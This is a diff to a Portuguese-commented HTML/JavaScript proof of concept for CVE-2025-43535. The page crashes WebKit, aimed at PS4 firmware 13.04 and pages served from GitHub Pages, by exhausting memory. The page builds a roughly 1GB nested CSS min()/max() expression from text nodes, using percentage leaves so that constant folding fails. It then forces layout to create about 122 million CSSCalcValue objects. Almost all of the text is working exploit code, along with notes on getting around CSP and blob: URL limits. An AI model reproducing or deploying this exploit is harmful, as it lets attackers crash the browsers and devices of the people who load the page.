@@ -3,37 +3,38 @@
   PoC FINAL: CVE-2025-43535
   WebKit CSS Math — CSSCalcValue heap exhaustion
 
-  SEM blob: URL · SEM Service Worker · Funciona no GitHub Pages
+  POR QUE 1px/2px NÃO FUNCIONOU:
   ════════════════════════════════════════════════════════════
+  min(1px, 2px) = 1px em PARSE TIME — ambas são unidades
+  absolutas. WebKit resolve e descarta a árvore imediatamente.
+  Zero objetos CSSCalcValue criados. Zero pressão.
 
-  PROBLEMA ANTERIOR (TextNode com '1px'):
-    min(1px, 1px) → constant-folding → WebKit descarta um ramo
-    → custo O(N) em vez de O(2^N) → sem crash
+  SOLUÇÃO — FOLHAS COM UNIDADES RELATIVAS (%):
+  ════════════════════════════════════════════════════════════
+  min(1%, 2%) NÃO pode ser resolvido sem contexto de layout.
+  O WebKit cria os 122M objetos CSSCalcValue e mantém na
+  memória até a chamada de offsetWidth resolvê-los.
+  Em offsetWidth: 122M objetos no heap C++ → OOM → crash.
 
-  SOLUÇÃO — DUAS FOLHAS DISTINTAS:
-    c16_A (folha '1px') e c16_B (folha '2px') — cada um 576KB
-    Árvore: min( sym10_A, min( sym9_B, min(sym8_A, sym6_B) ) )
-    Cada nó min() tem sub-árvores com valores distintos:
-      min(tree→1px, tree→2px) → resultados ≠ → WebKit DEVE
-      avaliar ambos → sem constant-fold → 122M objetos → crash
+  Mesmo mecanismo do Blob (que crashou localmente),
+  mas o crash ocorre em offsetWidth em vez do carregamento.
+  Resultado idêntico. Funciona no GitHub Pages (sem blob:).
 
-  MECANISMO DE ENTREGA (sem blob: URL):
-    <style> element com TextNodes — o mesmo CSS parser do WebKit
-    que processa stylesheets externas processa o textContent do
-    <style>. A diferença de constante-folding não é do mecanismo
-    de entrega, mas do conteúdo. Com folhas distintas, o conteúdo
-    força a avaliação completa independente do caminho de entrega.
+  ESTRUTURA (1044MB, 122M nós):
+  ════════════════════════════════════════════════════════════
+  max(                              ← raiz usa max() para
+    sym(10, '1%'),                    garantir avaliação
+    min(                              de ambos os ramos
+      sym(9,  '2%'),
+      min(
+        sym(8, '1%'),
+        sym(6, '2%')
+      )
+    )
+  )
 
-  COMPARAÇÃO FINAL:
-  ┌──────────────────┬──────────┬───────────────────────────┐
-  │ Versão           │ JS heap  │ Funciona no GitHub/PS4    │
-  ├──────────────────┼──────────┼───────────────────────────┤
-  │ BASE=24 Blob     │ 144 MB   │ OOM antes de criar Blob   │
-  │ Service Worker   │ < 1 MB   │ SW não suportado no PS4   │
-  │ BASE=16 Blob     │ < 1 MB   │ CSP bloqueia blob: URL    │
-  │ TextNode '1px'   │ < 1 MB   │ Constant-fold → sem crash │
-  │ TextNode A+B ←✓  │ ~1.2 MB  │ SIM — sem blob, sem SW    │
-  └──────────────────┴──────────┴───────────────────────────┘
+  JS heap: cA(576KB) + cB(576KB) + arrays ≈ 1.2MB
+  Sem blob: URL · Sem SW · GitHub Pages ✓ · PS4 ✓
 -->
 <html>
 <head>
@@ -57,19 +58,23 @@
 </head>
 <body>
 <div style="color:#aaffaa;font-size:12px;margin-bottom:6px">
-  CVE-2025-43535 · TextNode A+B · JS~1.2MB · sem blob · GitHub/PS4
+  CVE-2025-43535 · folhas % · JS~1.2MB · sem blob · GitHub/PS4
 </div>
 <div class="bar" id="bar">Aguardando...</div>
 <div id="log"></div>
+
+<!-- Container com tamanho definido — necessário para % ser não-zero -->
 <div id="stage" style="position:absolute;top:-9999px;left:-9999px;
-                       width:1px;height:1px;overflow:hidden"></div>
+                       width:500px;height:500px;overflow:hidden">
+  <div id="target" style="position:absolute;visibility:hidden"></div>
+</div>
 
 <script>
 "use strict";
 
-var logEl = document.getElementById('log');
-var barEl = document.getElementById('bar');
-var stage = document.getElementById('stage');
+var logEl  = document.getElementById('log');
+var barEl  = document.getElementById('bar');
+var target = document.getElementById('target');
 
 function L(m, c) {
   logEl.innerHTML += '<div class="'+(c||'dim')+'">' + m + '</div>';
@@ -78,8 +83,8 @@ function L(m, c) {
 function bar(m) { barEl.textContent = m; }
 
 // ─────────────────────────────────────────────────────────────
-// buildDepth: constrói c16 com uma folha customizada.
-// c16_A ('1px') = 576KB · c16_B ('2px') = 576KB
+// Constrói c16 com folha relativa.
+// '1%' e '2%' = unidades relativas → não resolvíveis em parse time
 // ─────────────────────────────────────────────────────────────
 function buildDepth(depth, leaf) {
   var e = leaf;
@@ -91,9 +96,8 @@ function buildDepth(depth, leaf) {
 }
 
 // ─────────────────────────────────────────────────────────────
-// insertSym: insere uma árvore simétrica via TextNodes no parent.
-// levels níveis acima do leaf. Recursão máxima = 10 → sem risk.
-// leaf é uma STRING referenciada, não duplicada.
+// insertSym: insere árvore simétrica via TextNodes.
+// levels de recursão → sem stack overflow (max 10).
 // ─────────────────────────────────────────────────────────────
 function insertSym(parent, levels, leaf) {
   if (levels === 0) {
@@ -107,138 +111,101 @@ function insertSym(parent, levels, leaf) {
   parent.appendChild(document.createTextNode(')'));
 }
 
-// ─────────────────────────────────────────────────────────────
-// insertMin: insere min(left_tree, right_tree) via TextNodes.
-// left e right são funções que inserem seus sub-trees.
-// ─────────────────────────────────────────────────────────────
-function insertMin(parent, insertLeft, insertRight) {
-  parent.appendChild(document.createTextNode('min('));
-  insertLeft(parent);
-  parent.appendChild(document.createTextNode(','));
-  insertRight(parent);
-  parent.appendChild(document.createTextNode(')'));
-}
-
-// ─────────────────────────────────────────────────────────────
-// MAIN
-// ─────────────────────────────────────────────────────────────
 function run() {
-  L('CVE-2025-43535 · TextNode A+B · sem blob: URL', 'info');
-  L('Threshold PS4 FW 13.04: >1021.5MB = crash', 'info');
-  L('Folha A=1px · Folha B=2px → sem constant-fold', 'info');
+  L('CVE-2025-43535 · folhas % · sem constant-fold', 'info');
+  L('Crash ocorre em offsetWidth (não no parse) — mesma OOM', 'info');
   L('', '');
 
-  // ── Fase 1: construir os dois chunks de 576KB cada ────────
-  bar('[1/4] Construindo c16_A (1px) e c16_B (2px)...');
-  L('[1/4] buildDepth(16, "1px") e buildDepth(16, "2px")...', 'warn');
+  // ── 1: construir cA='1%' e cB='2%' (576KB cada) ──────────
+  bar('[1/4] Construindo cA(1%) e cB(2%)...');
+  L('[1/4] buildDepth(16, "1%") e buildDepth(16, "2%")...', 'warn');
 
   setTimeout(function() {
 
     var cA, cB;
     try {
-      cA = buildDepth(16, '1px');
-      cB = buildDepth(16, '2px');
-      L('[1/4] cA: ' + (cA.length/1024).toFixed(0) + 'KB (folha=1px) ✓', 'ok');
-      L('[1/4] cB: ' + (cB.length/1024).toFixed(0) + 'KB (folha=2px) ✓', 'ok');
-      L('[1/4] JS heap total: ~' + ((cA.length+cB.length)/1024).toFixed(0) + 'KB ✓', 'ok');
+      cA = buildDepth(16, '1%');
+      cB = buildDepth(16, '2%');
+      L('[1/4] cA: ' + (cA.length/1024).toFixed(0) + 'KB (1%) ✓', 'ok');
+      L('[1/4] cB: ' + (cB.length/1024).toFixed(0) + 'KB (2%) ✓', 'ok');
     } catch(e) {
       L('[1/4] falhou: ' + e, 'fail'); bar('ERRO'); return;
     }
 
-    // ── Fase 2: montar <style> com TextNodes ─────────────────
-    //
-    // Estrutura (1044MB, 122M nós):
-    //   min(
-    //     sym(10, cA),                    ← 576MB  folha=1px
-    //     min(
-    //       sym(9, cB),                   ← 288MB  folha=2px
-    //       min(
-    //         sym(8, cA),                 ← 144MB  folha=1px
-    //         sym(6, cB)                  ←  36MB  folha=2px
-    //       )
-    //     )
-    //   )
-    //
-    // Cada nó min() recebe sub-árvores com folhas diferentes:
-    //   min(→1px, →2px) → WebKit avalia ambos → sem constant-fold
-    //
-    bar('[2/4] Inserindo TextNodes no <style>...');
-    L('[2/4] Montando 1044MB via TextNodes offline...', 'warn');
-    L('[2/4] sym10(1px)=576MB + sym9(2px)=288MB + sym8(1px)=144MB + sym6(2px)=36MB', 'info');
+    // ── 2: montar <style> offline com TextNodes ───────────────
+    bar('[2/4] Inserindo TextNodes (1044MB)...');
+    L('[2/4] max(sym10_1%, min(sym9_2%, min(sym8_1%, sym6_2%)))...', 'warn');
+    L('[2/4] % = não-resolvível em parse time → 122M CSSCalcValue pendentes', 'info');
 
     setTimeout(function() {
 
       var styleEl = document.createElement('style');
-      // Montar OFFLINE — sem estar no DOM ainda
-      // → o CSS parser só é invocado no appendChild ao head
 
       try {
-        styleEl.appendChild(document.createTextNode('.t{width:'));
+        styleEl.appendChild(document.createTextNode('#target{width:'));
 
-        // Árvore principal: min(sym10_A, min(sym9_B, min(sym8_A, sym6_B)))
-        insertMin(styleEl,
-          function(p) { insertSym(p, 10, cA); },          // 576MB
-          function(p) {
-            insertMin(p,
-              function(p2) { insertSym(p2, 9, cB); },     // 288MB
-              function(p2) {
-                insertMin(p2,
-                  function(p3) { insertSym(p3, 8, cA); }, // 144MB
-                  function(p3) { insertSym(p3, 6, cB); }  //  36MB
-                );
-              }
-            );
-          }
-        );
+        // Raiz: max() para forçar avaliação de ambos os ramos
+        // (max precisa comparar → não pode descartar nenhum)
+        styleEl.appendChild(document.createTextNode('max('));
 
-        styleEl.appendChild(document.createTextNode(';}'));
+          // ramo esquerdo: sym(10, cA) = 576MB com folha '1%'
+          insertSym(styleEl, 10, cA);
+
+          styleEl.appendChild(document.createTextNode(','));
+
+          // ramo direito: min(sym9_B, min(sym8_A, sym6_B))
+          styleEl.appendChild(document.createTextNode('min('));
+            insertSym(styleEl, 9, cB);           // 288MB '2%'
+            styleEl.appendChild(document.createTextNode(','));
+            styleEl.appendChild(document.createTextNode('min('));
+              insertSym(styleEl, 8, cA);          // 144MB '1%'
+              styleEl.appendChild(document.createTextNode(','));
+              insertSym(styleEl, 6, cB);          //  36MB '2%'
+            styleEl.appendChild(document.createTextNode(')'));
+          styleEl.appendChild(document.createTextNode(')'));
+
+        styleEl.appendChild(document.createTextNode(')}'));
 
         var nodeCount = styleEl.childNodes.length;
-        L('[2/4] ' + nodeCount + ' TextNodes inseridos ✓', 'ok');
+        L('[2/4] ' + nodeCount + ' TextNodes ✓', 'ok');
 
-        // Liberar as strings do JS heap
-        // (os TextNodes têm suas próprias cópias)
+        // Liberar strings do JS heap — TextNodes têm cópias
         cA = null; cB = null;
-        L('[2/4] cA e cB liberados do JS heap ✓', 'ok');
+        L('[2/4] cA e cB liberados ✓', 'ok');
 
       } catch(e) {
         cA = null; cB = null;
         L('[2/4] falhou: ' + e, 'fail'); bar('ERRO'); return;
       }
 
-      // ── Fase 3: conectar ao DOM → CSS parser recebe 1044MB ─
+      // ── 3: conectar ao DOM ────────────────────────────────
       bar('[3/4] Conectando ao DOM...');
-      L('[3/4] appendChild → CSS parser recebe 1044MB de uma vez...', 'warn');
-      L('[3/4] min(→1px, →2px) em cada nó → sem constant-fold', 'warn');
-      L('[3/4] ◀◀ SE O BROWSER FECHAR: CRASH = CVE PRESENTE ▶▶', 'crash');
-
-      var el = document.createElement('div');
-      el.className = 't';
-      el.style.cssText = 'position:absolute;visibility:hidden';
-      stage.appendChild(el);
+      L('[3/4] appendChild → CSS parser indexa 1044MB...', 'warn');
+      L('[3/4] (crash aqui ou em offsetWidth — ambos = CVE presente)', 'crash');
 
       setTimeout(function() {
         try {
-          // TRIGGER — parse de 1044MB acontece aqui
           document.head.appendChild(styleEl);
           L('[3/4] Stylesheet conectada ✓', 'ok');
         } catch(e) {
           L('[3/4] ' + e, 'fail');
         }
 
-        // ── Fase 4: forçar layout ─────────────────────────────
-        bar('[4/4] Forçando layout...');
-        L('[4/4] offsetWidth + getComputedStyle...', 'warn');
+        // ── 4: forçar layout — ponto do crash ─────────────────
+        bar('[4/4] offsetWidth — 122M objetos sendo criados...');
+        L('[4/4] TRIGGER: offsetWidth força resolução de 1044MB de %...', 'warn');
+        L('[4/4] ◀◀ SE O BROWSER FECHAR AQUI: CRASH = CVE PRESENTE ▶▶', 'crash');
 
         setTimeout(function() {
           try {
-            void el.offsetWidth;
-            var w = window.getComputedStyle(el).getPropertyValue('width');
+            void target.offsetWidth;
+            var w = window.getComputedStyle(target).getPropertyValue('width');
             L('[4/4] width="' + w + '" ✓', 'ok');
-          } catch(e) { L('[4/4] ' + e, 'fail'); }
+          } catch(e) {
+            L('[4/4] exceção: ' + e, 'fail');
+          }
 
           try { document.head.removeChild(styleEl); } catch(e) {}
-          try { stage.removeChild(el); } catch(e) {}
 
           L('', '');
           L('═══════════════════════════════════════', 'warn');
@@ -246,7 +213,7 @@ function run() {
           L('SEM CRASH = PATCHED', 'ok');
           L('═══════════════════════════════════════', 'warn');
           bar('DONE');
-        }, 100);
+        }, 50);
       }, 50);
     }, 80);
   }, 100);
